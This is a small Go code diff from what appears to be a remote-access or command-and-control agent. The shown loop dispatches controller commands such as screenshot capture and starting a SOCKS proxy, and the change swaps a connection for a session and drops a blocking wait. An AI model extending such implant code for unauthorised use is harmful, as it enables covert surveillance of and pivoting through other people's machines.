@@ -36,14 +36,11 @@ func main() {
 		case pb.SCREENSHOT_CMD_TYPE:
 			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
 		case pb.START_SOCKS_CMD_TYPE:
-			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Conn)
+			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Session)
 		}
 		err = controller.WriteCommandResponse(resp)
 		if err != nil {
 			log.Printf("Failed to write command response: %v", err)
-		}
-		if cmdReq.Type == pb.START_SOCKS_CMD_TYPE {
-			select {}
 		}
 	}
 }
